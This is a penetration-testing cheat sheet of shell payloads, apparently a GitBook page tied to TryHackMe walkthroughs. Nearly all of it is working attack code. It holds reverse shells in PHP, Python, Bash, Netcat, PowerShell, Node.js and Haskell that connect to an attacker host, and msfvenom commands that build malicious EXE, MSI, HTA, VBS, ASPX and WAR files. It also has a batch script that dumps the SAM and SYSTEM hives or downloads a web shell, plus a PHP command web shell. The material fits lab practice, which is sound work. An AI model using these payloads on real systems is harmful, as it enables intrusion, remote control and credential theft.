# Payloads



## **Reverse Shell Generator**

Great site to just add your IP and port and gives you a list of many options for shells.

{% embed url="https://www.revshells.com/" %}

## Windows

### Powershell

**Examples**

[alfred.md](../walkthroughs/tryhackme/alfred.md "mention")

**Kali**

```
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 
```

Edit the file and add the following to the end of the file. This is just to make it a bit easier when we use it later.

```
Invoke-PowerShellTcp -Reverse -IPAddress $KALI -Port 4444
```

**Kali**

```
rlwrap nc -lvnp 4444
```

### EXE

**Examples**

[alfred.md](../walkthroughs/tryhackme/alfred.md "mention")

**Kali**&#x20;

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=$KALI LPORT=1337 -f exe -o shell.exe
python2 -m SimpleHTTPServer 81
```

## BAT

**Examples**

[avenger.md](../walkthroughs/tryhackme/avenger.md "mention")

Used when you can upload a file which will run afterwards.

**exploit.bat**

<pre><code><strong>@echo off
</strong>
:: Check if the current user is NT AUTHORITY\SYSTEM
whoami /groups | find "S-1-5-18" > nul

if %errorlevel% equ 0 (
    :: Run commands for NT AUTHORITY\SYSTEM
    reg.exe save HKLM\SYSTEM C:\xampp\htdocs\system.bak
    reg.exe save HKLM\SAM C:\xampp\htdocs\sam.bak
) else (
    :: Run commands for other users
    curl http://$KALI:82/shell.php -o C:\xampp\htdocs\shell.php
)
</code></pre>

## **NIM**

**Examples**

[avenger.md](../walkthroughs/tryhackme/avenger.md "mention")

**Kali**

<pre><code>git clone https://github.com/Sn1r/Nim-Reverse-Shell.git
cd Nim-Reverse-Shell/
<strong>apt install mingw-w64 -y
</strong></code></pre>

**Kali**

```
curl https://nim-lang.org/choosenim/init.sh -sSf | sh
```

**Kali**

```
subl rev_shell.nim
```



<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**&#x20;

```
/root/.nimble/bin/nim c -d:mingw  --app:gui --opt:speed -o:Calculator.exe rev_shell.nim
```

## **MSI**

**Examples**

[cyberlens.md](../walkthroughs/tryhackme/cyberlens.md "mention")



## **Commix**

Can be used for web sites that are vulnerable to command injection.

**Kali**

```
rlwrap nc -lvnp 1338
```

**Victim(powershell)**

```
cd C:\temp\shell.msi
iwr -uri "http://$KALI:82/shell.msi" -o shell.msi
msiexec /quiet /qn /i C:\temp\shell.msi
```

<figure><img src="../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
git clone https://github.com/commixproject/commix.git commix
cd commix/
python commix.py -r ../request.txt 
```

<figure><img src="../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

## **PHP Reverse Shell**

**Examples**

[daily-bugle.md](../walkthroughs/tryhackme/daily-bugle.md "mention")

&#x20;**Kali**&#x20;

```
git clone https://github.com/pentestmonkey/php-reverse-shell.git
```

#### PHP Reverse shell #2

**Examples**

[retro.md](../walkthroughs/tryhackme/retro.md "mention")

```
<?php
// Copyright (c) 2020 Ivan `incek
// v2.5
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer  = 1024;    // read/write buffer size
    private $clen    = 0;       // command length
    private $error   = false;   // stream read/write error
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function detect() {
        $detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS
            $this->os    = 'LINUX';
            $this->shell = '/bin/sh';
        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
        } else if (posix_setsid() < 0) {
            // once daemonized you will actually no longer see the script's dump
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump($data) {
        $data = str_replace('<', '&lt;', $data);
        $data = str_replace('>', '&gt;', $data);
        echo $data;
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot read from {$name}, script will now exit...\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot write to {$name}, script will now exit...\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
            $this->dump($data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // we need to discard the data from the stream
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data); // script's dump
        }
    }
    public function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();

            // ----- SOCKET BEGIN -----
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: {$status['pid']}\n");
                    do {
                        $status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.10.167.13', 9000);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>
```

**Kali**

```
rlwrap nc -lvnp 9000
```

#### PHP Reverse shell #3

**Examples**

[chocolate-factory.md](../walkthroughs/tryhackme/chocolate-factory.md "mention")

**Web**

```
php -r '$sock=fsockopen("$KALI",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### PHP web shell

**Examples**

[retro.md](../walkthroughs/tryhackme/retro.md "mention")

```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```

## APSX

**Examples**

[relevant.md](../walkthroughs/tryhackme/relevant.md "mention")

**Kali #1**

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.179.48  LPORT=1337 — platform windows -a x64 -f aspx -o shell.aspx
```

**Kali #2**

<pre><code><strong>rlwrap nc -lvnp 1337
</strong></code></pre>



## HTA

**Examples**

[weaponization.md](../walkthroughs/tryhackme/weaponization.md "mention")

**Kali #1**

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f hta-psh -o thm.hta
python2 -m SimpleHTTPServer 81
```

**Kali #2**

```
rlwrap nc -lvnp 443
```



### VBS

**Examples**

[weaponization.md](../walkthroughs/tryhackme/weaponization.md "mention")

**Kali #1**

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f vbs -o exploit.vbs
```

**Kali #2**

```
rlwrap nc -lvnp 443
```

### DOC

**Examples**

[weaponization.md](../walkthroughs/tryhackme/weaponization.md "mention")

### PS1

**Kali #1**

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f psh -o exploit.ps1
```

**Kali #2**

```
rlwrap nc -lvnp 443
```



## Haskell

**Examples**

[haskhell.md](../walkthroughs/tryhackme/haskhell.md "mention")

### **revshell.hs**

```
import Network.Socket hiding (send, sendTo, recv, recvFrom)
import Network.Socket.ByteString (send, recv)
import qualified Data.ByteString.Char8 as B8
import System.Process
import System.IO
import Control.Exception

main = do
        client "$KALI" 1234

client :: String -> Int -> IO ()
client host port = withSocketsDo $ do
                addrInfo <- getAddrInfo Nothing (Just host) (Just $ show port)
                let serverAddr = head addrInfo
                sock <- socket (addrFamily serverAddr) Stream defaultProtocol
                connect sock (addrAddress serverAddr)
                (_, Just hout, _, _) <- createProcess (proc "whoami" []) {std_out = CreatePipe}
                resultOut <- hGetContents hout
                let resultMsg = B8.pack resultOut
                send sock resultMsg
                msgSender sock
                close sock

msgSender :: Socket -> IO ()
msgSender sock = do
  let msg = B8.pack ""
  send sock msg
  rMsg <- recv sock 1024
  let split_cmd = words (filter (/= '\n') (B8.unpack rMsg))
  result <- try' $ createProcess (proc (head split_cmd) (tail split_cmd)) {std_out = CreatePipe, std_err = CreatePipe}
  case result of 
    Left ex                            -> sendError sock ex
    Right (_, Just hout, Just herr, _) -> sendResult sock (Nothing, Just hout, Just herr, Nothing)
  msgSender sock
  
 
try' :: IO a -> IO (Either IOException a)
try' = try

sendError sock err = do
  let errorMsg = B8.pack ("Error:" ++ show err ++ "\n")
  send sock errorMsg
  
sendResult sock (_, Just hout, Just herr, _) = do
    resultOut <- hGetContents hout
    errorOut <- hGetContents herr
    let resultMsg = B8.pack resultOut
    let errorMsg = B8.pack errorOut
    send sock resultMsg
    send sock errorMsg
  
```



### **revshell2.hs**

```
module Main where

import System.Process

main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc $KALI 4242 >/tmp/f"
```





**Python Bind Shell**

```
python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",443));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

**Python Reverse Shell**

```
export RHOST="10.10.10.10"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

**Bash Reverse Shells**

```
/bin/bash -i >& /dev/tcp/10.0.0.1/443 0>&1
```

## **Msfvenom Reverse Shells**

#### **Staged Payloads for Windows - x86**

```
msfvenom -p windows/shell/reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f exe > shell-x86.exe
```

#### **Staged Payloads for Windows - x64**

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f exe > shell-x64.exe
```

#### **Stageless Payloads for Windows - x86**&#x20;

```
msfvenom -p windows/shell_reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f exe > shell-x86.exe
```

#### **Stageless Payloads for Windows - x64**&#x20;

```
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=$KALIPORT -f exe > shell-x64.exe
```

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$KALI LPORT=$PORT -f elf -o rshell.elf
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=$LPORT -f asp -o rshell.asp
```

```
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$KALI -f raw -o rshell.php
```

```
msfvenom -p windows/shell_reverse_tcp LHOST= $KALI LPORT=$LPORT -f hta-psh -o rshell.hta
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=$LPORT -f powershell
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=$LPORT -f msi -o rshell.msi
```

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$KALI LPORT=$LPORT -f war > rshell.war
```

#### **Netcat Reverse Shells**

```
sudo nc -nv 10.10.10.10 443 -e /bin/bash
```

```
nc -nv 10.10.10.10 443 -e "/bin/bash"
```

#### **PowerShell Reverse Shell**

```
'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("$KALI",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

#### **JavaScript Reverse Shell**

```
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", []);
    var client = new net.Socket();
    client.connect(4444, $KALI", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

#### Python Reverse Shell

```
from os import dup2
from subprocess import run
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("$KALI",1337)) 
dup2(s.fileno(),0) 
dup2(s.fileno(),1) 
dup2(s.fileno(),2) 
run(["/bin/bash","-i"])
```

#### **Upgrade to a PTY Shell**

```
echo "import pty; pty.spawn('/bin/bash')" > /tmp/shell.py
python /tmp/shell.py
export TERM=xterm # be able to clear the screen, etc.
```

#### HTA

Under section _'An HTML Application - HTA'_

{% embed url="https://tryhackme.com/room/weaponization" %}

#### VBS

Under section _'Visual Basic for Application - VBA'_

{% embed url="https://tryhackme.com/room/weaponization" %}

## **Full TTYs**

### **Useful Links**

&#x20;[https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys)

### **Spawn shells**

Go through the list one by one until something works

**Victim**

```
python -c 'import pty; pty.spawn("/bin/sh")'
python2 -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/sh")'
echo os.system('/bin/bash')
/bin/sh -i
script -qc /bin/bash /dev/null
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
IRB: exec "/bin/sh"
vi: :!bash
vi: :set shell=/bin/bash:shell
nmap: !sh
```

**Victim**

```
ctrl + Z
stty raw -echo;fg
```

